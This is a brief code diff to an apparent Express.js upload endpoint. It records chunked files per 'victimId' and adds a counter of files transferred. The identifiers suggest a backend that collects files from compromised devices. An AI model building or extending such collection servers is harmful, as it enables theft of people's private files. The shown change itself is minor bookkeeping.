@@ -130,6 +130,7 @@ app.post('/upload', (req, res) => {
       // Add the file to the list only if it's not already there
       if (!connectedDevices[victimId].fileList.includes(filename)) {
         connectedDevices[victimId].fileList.push(filename);
+        connectedDevices[victimId].filesTransferred += 1;
       }
 
       if (chunkIndex === totalChunks) {
